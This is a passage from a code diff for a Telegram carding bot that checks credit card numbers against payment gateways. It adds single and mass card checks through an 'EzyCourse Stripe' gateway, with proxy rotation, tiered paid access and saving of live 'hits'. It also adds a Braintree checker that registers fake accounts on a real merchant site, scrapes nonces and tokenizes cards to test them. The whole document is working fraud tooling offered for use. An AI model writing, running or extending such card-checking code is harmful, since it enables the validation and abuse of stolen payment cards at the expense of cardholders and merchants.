+        f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {clean_message}\n"
+        f"[⌬] 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
+        f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank_display}\n"
+        f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country_name}\n"
+    )
+    
+    return ui, status_category
+
+
+# ============ EZYCOURSE SINGLE CHECK ============
+
+@check_gateway("ezycourse")
+async def single_check_ezycourse(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Single card check with EzyCourse Stripe gateway - /ch <card>"""
+    if not await verify_group_access(update, context):
+        return
+    
+    if not context.args:
+        await update.message.reply_text(
+            "💳 <b>EzyCourse Stripe Gateway</b>\n\n"
+            "Usage: <code>/ch &lt;card&gt;</code>\n"
+            "Example: <code>/ch 4111111111111111|12|2028|123</code>\n\n"
+            "💰 Amount: $0.00 (Setup Intent - No charge)\n"
+            "📍 Gateway: EzyCourse Stripe\n"
+            "✅ Checks: CVV Live, 3DS, Insufficient Funds",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    user_id = update.effective_user.id
+    message = update.effective_message
+    card_text = " ".join(context.args).strip()
+    
+    # Extract card
+    card = card_formatter.extract_single_card_from_text(card_text)
+    if not card:
+        await message.reply_text(
+            "❌ Invalid card format. Use: NUMBER|MM|YYYY|CVV\n"
+            "Example: 4111111111111111|12|2028|123"
+        )
+        return
+    
+    # Check credits
+    can_proceed, error_msg = await check_and_deduct_credits(user_id, update, context, is_mass_check=False, card_count=1)
+    if not can_proceed:
+        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
+        return
+    
+    # Check gateway access
+    if not user_manager.can_access_gateway(user_id, 'stripe_auth'):
+        tier = user_manager.get_tier(user_id)
+        await message.reply_text(
+            f"❌ <b>EzyCourse not available for {tier.upper()} tier</b>\n\n"
+            f"Upgrade to Premium/Ultimate to use this gateway.",
+            parse_mode=ParseMode.HTML
+        )
+        add_user_credits(user_id, 1)
+        return
+    
+    ezycourse_active_tasks[user_id] = True
+    
+    try:
+        tier = user_manager.get_tier(user_id)
+        if user_id not in user_speed_controllers:
+            user_speed_controllers[user_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
+        speed_controller = user_speed_controllers[user_id]
+        
+        status_msg = await message.reply_text("🔄 Checking ...")
+        
+        await speed_controller.wait_if_needed()
+        start = time.time()
+        
+        # Get proxy if allowed
+        proxy_str = None
+        if user_manager.can_use_proxy(user_id):
+            if user_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[user_id]:
+                proxy_list = autosopi_proxy_tracker.working_proxies[user_id]
+                if proxy_list:
+                    proxy_str = proxy_list[0]
+                    print(f"🔌 [EzyCourse] Using proxy: {mask_proxy(proxy_str)}")
+        
+        result = await check_card_ezycourse(card, proxy_str, user_id)
+        
+        elapsed = time.time() - start
+        speed_controller.record_response(elapsed)
+        
+        bin_info = await get_bin_info(card)
+        
+        try:
+            await status_msg.delete()
+        except:
+            pass
+        
+        ui, status_category = format_ezycourse_response(result, card, bin_info)
+        await message.reply_text(ui, parse_mode=ParseMode.HTML)
+        
+        if status_category in ["charged", "approved"]:
+            await save_hit_to_file(
+                card=card, gateway="EzyCourse Stripe",
+                response=result.get("message", "Approved"),
+                price="$0.00",
+                bin_info=bin_info, user_id=user_id, user_tier=tier
+            )
+            
+            if status_category == "charged":
+                user_data = user_manager.get_user(user_id)
+                await send_hit_notification(
+                    context=context, gateway="EzyCourse Stripe", card=card,
+                    response=result.get("message", "Charged"),
+                    price="$0.00",
+                    user=user_data, bin_info=bin_info, status_category="charged"
+                )
+                user_manager.increment_hits(user_id)
+        
+        user_manager.increment_checks(user_id)
+        
+        # Show remaining credits for free users
+        if user_manager.get_tier(user_id) == 'free':
+            remaining = get_user_credits(user_id)
+            await message.reply_text(
+                f"💎 <b>Credits Remaining: {remaining}</b>\n"
+                f"Use /credits to check balance.",
+                parse_mode=ParseMode.HTML
+            )
+        
+    except Exception as e:
+        try:
+            await status_msg.delete()
+        except:
+            pass
+        await message.reply_text(f"❌ Error: {str(e)[:100]}")
+        print(f"❌ [EzyCourse] Error: {traceback.format_exc()}")
+        add_user_credits(user_id, 1)
+    finally:
+        ezycourse_active_tasks.pop(user_id, None)
+
+
+# ============ EZYCOURSE MASS CHECK ============
+
+@check_gateway("ezycourse")
+async def mass_check_ezycourse(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Mass card check with EzyCourse Stripe gateway - /mch <cards>"""
+    if not await verify_group_access(update, context):
+        return
+    
+    user_id = update.effective_user.id
+    message = update.effective_message
+    
+    if not user_manager.can_access_gateway(user_id, 'stripe_auth'):
+        tier = user_manager.get_tier(user_id)
+        await message.reply_text(
+            f"❌ EzyCourse not available for {tier.upper()} tier.",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    if not user_manager.can_mass_check(user_id):
+        tier = user_manager.get_tier(user_id)
+        await message.reply_text(
+            f"❌ Mass check not available for {tier.upper()} tier.\n\n"
+            f"Use /ch for single checks.\n"
+            f"💎 Upgrade to Premium/Ultimate for mass checks.",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    # Check if reply to file
+    if message.reply_to_message and message.reply_to_message.document:
+        try:
+            file = await message.reply_to_message.document.get_file()
+            content = await file.download_as_bytearray()
+            content = content.decode('utf-8', errors='ignore')
+            
+            cards = []
+            for line in content.splitlines():
+                line = line.strip()
+                if line and not line.startswith('#'):
+                    card = card_formatter.extract_single_card_from_text(line)
+                    if card:
+                        cards.append(card)
+            
+            if not cards:
+                await message.reply_text("❌ No valid cards found in file.")
+                return
+                
+            await message.delete()
+            await ezycourse_mass_check_logic(update, context, cards, None)
+            return
+            
+        except Exception as e:
+            await message.reply_text(f"❌ Error reading file: {str(e)[:100]}")
+            return
+    
+    if not context.args:
+        await message.reply_text(
+            "📦 <b>EzyCourse Stripe Mass Check</b>\n\n"
+            "Usage: <code>/mch &lt;card1&gt; &lt;card2&gt; ...</code>\n"
+            "Or reply to a .txt file with /mch\n\n"
+            "Example: <code>/mch 4111111111111111|12|2028|123 4222222222222222|11|2026|456</code>\n\n"
+            "💰 Amount: $0.00 (Setup Intent - No charge)\n"
+            "📍 Gateway: EzyCourse Stripe\n"
+            "✅ Only CVV Live/3DS cards will be shown\n"
+            "❌ Declined cards are hidden from chat",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    cards_text = " ".join(context.args)
+    card_strings = cards_text.split()
+    
+    cards = []
+    for card_str in card_strings:
+        card = card_formatter.extract_single_card_from_text(card_str)
+        if card:
+            cards.append(card)
+    
+    if not cards:
+        await message.reply_text("❌ No valid cards found.")
+        return
+    
+    # Check batch size limit
+    max_batch = user_manager.get_max_batch_size(user_id)
+    if len(cards) > max_batch:
+        cards = cards[:max_batch]
+        await message.reply_text(f"⚠️ Your tier allows max {max_batch} cards. Truncating.")
+    
+    # Check credits for mass check (1 credit per card for free users)
+    can_proceed, error_msg = await check_and_deduct_mass_credits(user_id, update, context, len(cards))
+    if not can_proceed:
+        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
+        return
+    
+    try:
+        await message.delete()
+    except:
+        pass
+    
+    await ezycourse_mass_check_logic(update, context, cards, None)
+
+
+# ============ UPDATED: EZYCOURSE MASS CHECK WITH PARALLEL PROCESSING ============
+
+async def ezycourse_mass_check_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list, progress_msg=None):
+    """Mass check logic for EzyCourse Stripe gateway - PROCESSES 10 CARDS AT A TIME"""
+    u_id = update.effective_user.id
+    message = update.effective_message
+    total = len(cards)
+    
+    print(f"\n{'='*80}")
+    print(f"🚀 [EZYCOURSE MASS CHECK] Starting batch for user {u_id}")
+    print(f"📊 Total cards: {total}")
+    print(f"⚡ Processing: 10 cards at a time (parallel)")
+    print(f"{'='*80}")
+    
+    # Get user's working proxies
+    user_proxies = []
+    if user_manager.can_use_proxy(u_id):
+        if u_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[u_id]:
+            user_proxies = autosopi_proxy_tracker.working_proxies[u_id]
+            print(f"🔌 Found {len(user_proxies)} working proxies for rotation")
+    
+    stats = {
+        "approved": 0,
+        "declined": 0,
+        "errors": 0,
+        "total": total,
+        "processed": 0
+    }
+    
+    start_time = time.time()
+    proxy_index = 0
+    
+    try:
+        ezycourse_active_tasks[u_id] = True
+        
+        tier = user_manager.get_tier(u_id)
+        
+        # ============ FIX: Set concurrency to 10 ============
+        CONCURRENCY = 10  # Process 10 cards at a time
+        
+        approved_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
+        dead_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
+        errors_emoji = premium_emoji(PREMIUM_EMOJI_IDS["error"], "⚠️")
+        
+        if progress_msg is None:
+            progress_text = (
+                f"<b>Gateway</b> ➛ EzyCourse Stripe\n"
+                f"<b>Status</b> ➛ STARTING...\n"
+                f"<b>Checked</b> ➛ 0/{total}\n"
+                f"<b>Approved</b> ➛ 0 {approved_emoji}\n"
+                f"<b>Declined</b> ➛ 0 {dead_emoji}\n"
+                f"<b>Errors</b> ➛ 0 {errors_emoji}\n"
+                f"<b>Time</b> ➛ 0s"
+            )
+            progress_msg = await message.reply_text(progress_text, parse_mode=ParseMode.HTML)
+        
+        if u_id not in user_speed_controllers:
+            user_speed_controllers[u_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
+        speed_controller = user_speed_controllers[u_id]
+        
+        # ============ FIX: Semaphore allows 10 concurrent tasks ============
+        semaphore = asyncio.Semaphore(CONCURRENCY)
+        stats_lock = asyncio.Lock()
+        processed_count = 0
+        approved_cards = []  # Store approved cards for batch sending
+        
+        async def update_progress(current: int, force: bool = False):
+            if not force and current > 0 and current < total and current % 5 != 0:
+                return
+            elapsed = int(time.time() - start_time)
+            minutes = elapsed // 60
+            seconds = elapsed % 60
+            time_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"
+            
+            if current >= total:
+                status_text = "FINISHED ✅"
+            else:
+                status_text = f"PROCESSING {current}/{total}"
+            
+            progress_text = (
+                f"<b>Gateway</b> ➛ EzyCourse Stripe\n"
+                f"<b>Status</b> ➛ {status_text}\n"
+                f"<b>Checked</b> ➛ {current}/{total}\n"
+                f"<b>Approved</b> ➛ {stats['approved']} {approved_emoji}\n"
+                f"<b>Declined</b> ➛ {stats['declined']} {dead_emoji}\n"
+                f"<b>Errors</b> ➛ 0 {errors_emoji}\n"
+                f"<b>Time</b> ➛ {time_str}"
+            )
+            try:
+                await progress_msg.edit_text(progress_text, parse_mode=ParseMode.HTML)
+            except Exception as e:
+                if "message is not modified" not in str(e).lower():
+                    print(f"⚠️ Progress update error: {e}")
+        
+        async def process_single_card(card: str, idx: int):
+            """Process a single card - runs concurrently with others"""
+            nonlocal processed_count, proxy_index
+            
+            async with semaphore:
+                # Get proxy for this card (rotate through user's proxies)
+                proxy_str = None
+                if user_proxies:
+                    proxy_str = user_proxies[proxy_index % len(user_proxies)]
+                    proxy_index += 1
+                
+                # Apply speed control
+                await speed_controller.wait_if_needed()
+                
+                start = time.time()
+                result = await check_card_ezycourse(card, proxy_str, u_id)
+                elapsed = time.time() - start
+                speed_controller.record_response(elapsed)
+                
+                bin_info = await get_bin_info(card)
+                status_category = result.get("status_category", "unknown")
+                
+                async with stats_lock:
+                    processed_count += 1
+                    
+                    if status_category == "approved":
+                        stats["approved"] += 1
+                        approved_cards.append((card, result, bin_info))
+                        print(f"✅ [APPROVED] {card[:20]}...")
+                    elif status_category == "declined":
+                        stats["declined"] += 1
+                        print(f"❌ [DECLINED] {card[:20]}...")
+                    else:
+                        stats["declined"] += 1  # Treat errors as declined
+                        print(f"⚠️ [ERROR - DECLINED] {card[:20]}...")
+                    
+                    # Update progress every 5 cards
+                    if processed_count % 5 == 0 or processed_count == total:
+                        await update_progress(processed_count)
+                
+                return result, card, bin_info, status_category
+        
+        # ============ FIX: Process cards in batches of 10 concurrently ============
+        BATCH_SIZE = 10
+        
+        for batch_start in range(0, total, BATCH_SIZE):
+            if u_id not in ezycourse_active_tasks:
+                break
+            
+            batch_end = min(batch_start + BATCH_SIZE, total)
+            batch_cards = cards[batch_start:batch_end]
+            batch_number = (batch_start // BATCH_SIZE) + 1
+            total_batches = (total + BATCH_SIZE - 1) // BATCH_SIZE
+            
+            print(f"\n📦 Processing Batch {batch_number}/{total_batches} ({len(batch_cards)} cards)")
+            
+            # Create tasks for all cards in this batch
+            tasks = []
+            for idx, card in enumerate(batch_cards, batch_start):
+                task = asyncio.create_task(process_single_card(card, idx))
+                tasks.append(task)
+            
+            # Wait for all cards in this batch to complete
+            batch_results = await asyncio.gather(*tasks, return_exceptions=True)
+            
+            # Process any errors
+            for result in batch_results:
+                if isinstance(result, Exception):
+                    print(f"❌ Batch task error: {result}")
+                    async with stats_lock:
+                        stats["declined"] += 1
+                        stats["processed"] += 1
+            
+            # Send approved cards from this batch
+            async with stats_lock:
+                if approved_cards:
+                    for card, result, bin_info in approved_cards:
+                        ui, _ = format_ezycourse_response(result, card, bin_info)
+                        try:
+                            await message.reply_text(ui, parse_mode=ParseMode.HTML)
+                            print(f"📤 [SENT] {card[:20]}...")
+                        except Exception as e:
+                            print(f"❌ Error sending result: {e}")
+                        
+                        # Save hit to file
+                        await save_hit_to_file(
+                            card=card, gateway="EzyCourse Stripe",
+                            response=result.get("message", "Approved"),
+                            price="$0.00",
+                            bin_info=bin_info, user_id=u_id, user_tier=tier
+                        )
+                        
+                        user_data = user_manager.get_user(u_id)
+                        await send_hit_notification(
+                            context=context, gateway="EzyCourse Stripe", card=card,
+                            response=result.get("message", "Approved"),
+                            price="$0.00",
+                            user=user_data, bin_info=bin_info, status_category="approved"
+                        )
+                        user_manager.increment_hits(u_id)
+                    
+                    # Clear approved cards after sending
+                    approved_cards.clear()
+            
+            # Update progress after batch
+            async with stats_lock:
+                await update_progress(processed_count, force=True)
+            
+            # Small delay between batches to avoid rate limiting
+            if batch_end < total:
+                await asyncio.sleep(0.5)
+        
+        # Final summary
+        if u_id in ezycourse_active_tasks:
+            total_time = time.time() - start_time
+            minutes = int(total_time // 60)
+            seconds = int(total_time % 60)
+            
+            skull_emoji = premium_emoji(PREMIUM_EMOJI_IDS["skull"], "💀")
+            
+            summary = (
+                f"{skull_emoji} <b>EzyCourse Mass Check Complete</b>\n\n"
+                f"{approved_emoji} <b>Approved</b> ➛ {stats['approved']}\n"
+                f"{dead_emoji} <b>Declined</b> ➛ {stats['declined']} (Hidden)\n"
+                f"{errors_emoji} <b>Errors</b> ➛ 0\n"
+                f"📝 <b>Total</b> ➛ {total}\n"
+                f"⚡ <b>Speed</b> ➛ {total / (total_time / 60):.1f} cards/min\n"
+                f"⏱️ <b>Time</b> ➛ {minutes}m {seconds}s\n"
+                f"{skull_emoji} <b>Bot</b> ➛ @BLADESARKS_V3bot"
+            )
+            
+            await update_progress(total, force=True)
+            await message.reply_text(summary, parse_mode=ParseMode.HTML)
+            print(f"📊 Final summary sent to user {u_id}")
+        
+        return stats
+        
+    except Exception as e:
+        print(f"❌ EzyCourse mass check error: {e}")
+        traceback.print_exc()
+        try:
+            if progress_msg:
+                await progress_msg.edit_text(f"❌ Error: {str(e)[:100]}")
+            else:
+                await message.reply_text(f"❌ Error: {str(e)[:100]}")
+        except:
+            pass
+    finally:
+        ezycourse_active_tasks.pop(u_id, None)
+        print(f"🏁 [EzyCourse Mass] Session ended for user {u_id}")
 # ============ ADYEN GATEWAY (Picsart) - FIXED ============
 # Add this after your other gateway configurations
 
@@ -26227,7 +27339,7 @@ async def check_site_product_prices(site_url: str) -> Tuple[bool, List[float], s
             all_prices = sorted(list(set(all_prices)))
             
             # ============ CHANGED: Check for products under $50 (was $10) ============
-            cheap_prices = [p for p in all_prices if p < 50]
+            cheap_prices = [p for p in all_prices if p < 3]
             
             if cheap_prices:
                 cheap_products = len(cheap_prices)
@@ -27394,7 +28506,7 @@ async def broadcast_worker(context: ContextTypes.DEFAULT_TYPE):
             user_id = int(user["id"])
             await context.bot.send_message(
                 chat_id=user_id,
-                text=f"📢 <b>Broadcast Message</b>\n\n{broadcast['message']}",
+                text=f"\n\n{broadcast['message']}",
                 parse_mode=ParseMode.HTML
             )
             broadcast_manager.mark_sent(broadcast["id"], user_id)
@@ -27793,7 +28905,1106 @@ async def single_check_payflow_command(update: Update, context: ContextTypes.DEF
     # Call the existing payflow single check logic
     await payflow_single_check_logic(update, context, card)
 
-# ============ SHOPIFY SINGLE CHECK GATEWAY (AUTOSOPI MAIN API) ============
+
+
+# ============ BRAINTREE AUTH GATEWAY (DNA LASERING) ============
+# Add this to your f13.py
+
+import requests
+import re
+import base64
+import json
+import asyncio
+import traceback
+import random
+from typing import Dict, Tuple, Optional, List
+from datetime import datetime
+from faker import Faker
+from user_agent import generate_user_agent
+
+# Active tasks for Braintree Auth
+braintree_auth_active_tasks = {}
+
+# ============ BRAINTREE AUTH CONFIG ============
+BRAINTREE_AUTH_URL = "https://www.dnalasering.com"
+BRAINTREE_AUTH_REGISTER_URL = f"{BRAINTREE_AUTH_URL}/my-account/"
+BRAINTREE_AUTH_ADD_PAYMENT = f"{BRAINTREE_AUTH_URL}/my-account/add-payment-method/"
+BRAINTREE_AUTH_EDIT_ADDRESS = f"{BRAINTREE_AUTH_URL}/my-account/edit-address/billing/"
+BRAINTREE_AUTH_AJAX = f"{BRAINTREE_AUTH_URL}/wp-admin/admin-ajax.php"
+BRAINTREE_GRAPHQL_URL = "https://payments.braintree-api.com/graphql"
+
+def generate_braintree_user_data():
+    """Generate fake user data for Braintree registration"""
+    fake = Faker()
+    first_name = fake.first_name()
+    last_name = fake.last_name()
+    email = f"{first_name.lower()}.{last_name.lower()}{random.randint(10, 9999)}@gmail.com"
+    name = f"{first_name} {last_name}"
+    phone = f"{random.randint(200,999)}{random.randint(100,999)}{random.randint(1000,9999)}"
+    return email, name, phone
+
+async def check_card_braintree_auth(card: str, proxy: str = None, user_id: int = None, retry_count: int = 0) -> Dict:
+    """
+    Check card using Braintree Auth gateway via DNA Lasering
+    This creates a payment method and adds it to the account
+    """
+    print(f"\n{'='*80}")
+    print(f"💳 [BRAINTREE AUTH] Checking card: {card[:20]}...")
+    if proxy:
+        print(f"🔌 Using proxy: {mask_proxy(proxy)}")
+    else:
+        print(f"🔌 No proxy - direct connection")
+    if retry_count > 0:
+        print(f"🔄 RETRY ATTEMPT #{retry_count}")
+    print(f"{'='*80}")
+    
+    default_result = {
+        "status": "error",
+        "result": "UNKNOWN_ERROR",
+        "message": "Unknown error occurred",
+        "status_display": "⚠️ ERROR",
+        "status_category": "error",
+        "elapsed": 0,
+        "price": "$0.00",
+        "gateway": "Braintree Auth"
+    }
+    
+    try:
+        # Parse card
+        parts = card.split('|')
+        if len(parts) != 4:
+            return {
+                "status": "error",
+                "result": "INVALID_FORMAT",
+                "message": "Invalid card format. Use: NUMBER|MM|YYYY|CVV",
+                "status_display": "⚠️ INVALID FORMAT",
+                "status_category": "error"
+            }
+        
+        cc, mm, yy, cvv = parts
+        
+        # Format year (API expects 4-digit)
+        if len(yy) == 2:
+            yy = f"20{yy}"
+        
+        # Generate user data
+        email, name, phone = generate_braintree_user_data()
+        print(f"👤 User: {name} | 📧 {email} | 📞 {phone}")
+        
+        # Setup session with proxy
+        session = requests.Session()
+        if proxy:
+            proxy_url = format_proxy(proxy)
+            if proxy_url:
+                session.proxies = {'http': proxy_url, 'https': proxy_url}
+                print(f"🔧 Using proxy: {mask_proxy(proxy_url)}")
+        
+        start_time = time.time()
+        user_agent = generate_user_agent()
+        
+        # ============ STEP 1: Get Registration Nonce ============
+        print(f"\n📡 [STEP 1] Getting registration nonce...")
+        
+        response = session.get(
+            BRAINTREE_AUTH_REGISTER_URL,
+            headers={'User-Agent': user_agent},
+            timeout=30
+        )
+        
+        if response.status_code != 200:
+            print(f"❌ Failed to get registration page: HTTP {response.status_code}")
+            default_result["message"] = "Failed to get registration page"
+            default_result["elapsed"] = time.time() - start_time
+            return default_result
+        
+        # Extract registration nonce
+        reg_nonce_match = re.search(r'name="woocommerce-register-nonce" value="([^"]+)"', response.text)
+        if not reg_nonce_match:
+            print("❌ Could not find registration nonce")
+            default_result["message"] = "Could not find registration nonce"
+            default_result["elapsed"] = time.time() - start_time
+            return default_result
+        
+        reg_nonce = reg_nonce_match.group(1)
+        print(f"✅ Registration nonce: {reg_nonce[:20]}...")
+        
+        # ============ STEP 2: Register Account ============
+        print(f"\n📡 [STEP 2] Registering account...")
+        
+        register_data = {
+            'email': email,
+            'wc_order_attribution_source_type': 'typein',
+            'wc_order_attribution_referrer': '(none)',
+            'wc_order_attribution_utm_campaign': '(none)',
+            'wc_order_attribution_utm_source': '(direct)',
+            'wc_order_attribution_utm_medium': '(none)',
+            'wc_order_attribution_utm_content': '(none)',
+            'wc_order_attribution_utm_id': '(none)',
+            'wc_order_attribution_utm_term': '(none)',
+            'wc_order_attribution_utm_source_platform': '(none)',
+            'wc_order_attribution_utm_creative_format': '(none)',
+            'wc_order_attribution_utm_marketing_tactic': '(none)',
+            'wc_order_attribution_session_entry': 'https://www.dnalasering.com/my-account/payment-methods/',
+            'wc_order_attribution_session_start_time': '2026-05-27 03:41:14',
+            'wc_order_attribution_session_pages': '3',
+            'wc_order_attribution_session_count': '1',
+            'wc_order_attribution_user_agent': user_agent,
+            'woocommerce-register-nonce': reg_nonce,
+            '_wp_http_referer': '/my-account/',
+            'register': 'Register',
+        }
+        
+        register_headers = {
+            'authority': 'www.dnalasering.com',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://www.dnalasering.com',
+            'referer': 'https://www.dnalasering.com/my-account/',
+            'user-agent': user_agent,
+        }
+        
+        response = session.post(
+            BRAINTREE_AUTH_REGISTER_URL,
+            headers=register_headers,
+            data=register_data,
+            timeout=30
+        )
+        
+        if response.status_code != 200:
+            print(f"❌ Registration failed: HTTP {response.status_code}")
+            default_result["message"] = "Registration failed"
+            default_result["elapsed"] = time.time() - start_time
+            return default_result
+        
+        print(f"✅ Account registered: {email}")
+        
+        # ============ STEP 3: Edit Billing Address ============
+        print(f"\n📡 [STEP 3] Setting billing address...")
+        
+        response = session.get(
+            BRAINTREE_AUTH_EDIT_ADDRESS,
+            headers={'User-Agent': user_agent},
+            timeout=30
+        )
+        
+        if response.status_code != 200:
+            print(f"⚠️ Failed to get edit address page: HTTP {response.status_code}")
+            # Continue anyway
+        
+        # Extract edit address nonce
+        edit_nonce_match = re.search(r'name="woocommerce-edit-address-nonce" value="([^"]+)"', response.text)
+        edit_nonce = edit_nonce_match.group(1) if edit_nonce_match else ''
+        print(f"✅ Edit address nonce: {edit_nonce[:20] if edit_nonce else 'Not found'}...")
+        
+        address_headers = {
+            'authority': 'www.dnalasering.com',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://www.dnalasering.com',
+            'referer': 'https://www.dnalasering.com/my-account/edit-address/billing/',
+            'user-agent': user_agent,
+        }
+        
+        address_data = {
+            'billing_first_name': name.split()[0] if ' ' in name else name,
+            'billing_last_name': name.split()[-1] if ' ' in name else name,
+            'billing_company': '',
+            'billing_country': 'US',
+            'billing_address_1': 'Hollow park city 49',
+            'billing_address_2': '',
+            'billing_city': 'New york',
+            'billing_state': 'NY',
+            'billing_postcode': '10080',
+            'billing_phone': phone,
+            'billing_email': email,
+            'save_address': 'Save address',
+            'woocommerce-edit-address-nonce': edit_nonce,
+            '_wp_http_referer': '/my-account/edit-address/billing/',
+            'action': 'edit_address',
+        }
+        
+        response = session.post(
+            BRAINTREE_AUTH_EDIT_ADDRESS,
+            cookies=session.cookies,
+            headers=address_headers,
+            data=address_data,
+            timeout=30
+        )
+        
+        print(f"✅ Billing address set")
+        
+        # ============ STEP 4: Get Add Payment Method Page ============
+        print(f"\n📡 [STEP 4] Getting add payment method page...")
+        
+        response = session.get(
+            BRAINTREE_AUTH_ADD_PAYMENT,
+            headers={'User-Agent': user_agent},
+            timeout=30
+        )
+        
+        if response.status_code != 200:
+            print(f"❌ Failed to get add payment page: HTTP {response.status_code}")
+            default_result["message"] = "Failed to get add payment page"
+            default_result["elapsed"] = time.time() - start_time
+            return default_result
+        
+        # Extract add payment nonce
+        payment_nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', response.text)
+        payment_nonce = payment_nonce_match.group(1) if payment_nonce_match else ''
+        print(f"✅ Payment nonce: {payment_nonce[:20] if payment_nonce else 'Not found'}...")
+        
+        # Extract client token nonce
+        client_token_match = re.search(r'client_token_nonce":"([^"]+)"', response.text)
+        if not client_token_match:
+            client_token_match = re.search(r'client_token_nonce\\u0022:\\u0022([^"]+)\\u0022', response.text)
+        client_token_nonce = client_token_match.group(1) if client_token_match else ''
+        print(f"✅ Client token nonce: {client_token_nonce[:20] if client_token_nonce else 'Not found'}...")
+        
+        if not client_token_nonce:
+            print("❌ Could not find client token nonce")
+            default_result["message"] = "Could not find client token nonce"
+            default_result["elapsed"] = time.time() - start_time
+            return default_result
+        
+        # ============ STEP 5: Get Braintree Client Token ============
+        print(f"\n📡 [STEP 5] Getting Braintree client token...")
+        
+        ajax_data = {
+            'action': 'wc_braintree_credit_card_get_client_token',
+            'nonce': client_token_nonce,
+        }
+        
+        ajax_headers = {
+            'User-Agent': user_agent,
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'X-Requested-With': 'XMLHttpRequest',
+            'Origin': 'https://www.dnalasering.com',
+            'Referer': 'https://www.dnalasering.com/my-account/add-payment-method/',
+        }
+        
+        response = session.post(
+            BRAINTREE_AUTH_AJAX,
+            headers=ajax_headers,
+            data=ajax_data,
+            timeout=30
+        )
+        
+        if response.status_code != 200:
+            print(f"❌ Failed to get client token: HTTP {response.status_code}")
+            default_result["message"] = "Failed to get client token"
+            default_result["elapsed"] = time.time() - start_time
+            return default_result
+        
+        try:
+            ajax_result = response.json()
+            decoded = base64.b64decode(ajax_result['data']).decode('utf-8')
+            auth_fingerprint = json.loads(decoded).get('authorizationFingerprint')
+            print(f"✅ Auth fingerprint obtained: {auth_fingerprint[:30] if auth_fingerprint else 'Not found'}...")
+        except Exception as e:
+            print(f"❌ Failed to decode client token: {e}")
+            default_result["message"] = "Failed to decode client token"
+            default_result["elapsed"] = time.time() - start_time
+            return default_result
+        
+        if not auth_fingerprint:
+            print("❌ Could not get auth fingerprint")
+            default_result["message"] = "Could not get auth fingerprint"
+            default_result["elapsed"] = time.time() - start_time
+            return default_result
+        
+        # ============ STEP 6: Tokenize Credit Card ============
+        print(f"\n📡 [STEP 6] Tokenizing credit card...")
+        
+        # Determine card brand
+        card_brand = "visa"
+        if cc.startswith('5'):
+            card_brand = "mastercard"
+        elif cc.startswith('3'):
+            card_brand = "amex"
+        elif cc.startswith('6'):
+            card_brand = "discover"
+        
+        # Format year for Braintree (4-digit)
+        if len(yy) == 2:
+            yy_full = f"20{yy}"
+        else:
+            yy_full = yy
+        
+        graphql_payload = {
+            'clientSdkMetadata': {
+                'source': 'client',
+                'integration': 'custom',
+            },
+            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }',
+            'variables': {
+                'input': {
+                    'creditCard': {
+                        'number': cc,
+                        'expirationMonth': mm,
+                        'expirationYear': yy_full,
+                        'cvv': cvv,
+                    },
+                    'options': {
+                        'validate': False,
+                    },
+                },
+            },
+            'operationName': 'TokenizeCreditCard',
+        }
+        
+        graphql_headers = {
+            'authority': 'payments.braintree-api.com',
+            'authorization': f'Bearer {auth_fingerprint}',
+            'braintree-version': '2018-05-10',
+            'content-type': 'application/json',
+            'origin': 'https://assets.braintreegateway.com',
+            'referer': 'https://assets.braintreegateway.com/',
+            'user-agent': user_agent,
+        }
+        
+        response = session.post(
+            BRAINTREE_GRAPHQL_URL,
+            headers=graphql_headers,
+            json=graphql_payload,
+            timeout=30
+        )
+        
+        if response.status_code != 200:
+            print(f"❌ Tokenization failed: HTTP {response.status_code}")
+            default_result["message"] = "Tokenization failed"
+            default_result["elapsed"] = time.time() - start_time
+            return default_result
+        
+        try:
+            graphql_result = response.json()
+            token = graphql_result.get('data', {}).get('tokenizeCreditCard', {}).get('token')
+            if not token:
+                print("❌ Could not get payment token")
+                default_result["message"] = "Could not get payment token"
+                default_result["elapsed"] = time.time() - start_time
+                return default_result
+            print(f"✅ Payment token obtained: {token[:20]}...")
+        except Exception as e:
+            print(f"❌ Failed to parse tokenization response: {e}")
+            default_result["message"] = "Failed to parse tokenization response"
+            default_result["elapsed"] = time.time() - start_time
+            return default_result
+        
+        # ============ STEP 7: Add Payment Method ============
+        print(f"\n🔥 [STEP 7] Adding payment method...")
+        
+        add_payment_headers = {
+            'authority': 'www.dnalasering.com',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
+            'cache-control': 'max-age=0',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://www.dnalasering.com',
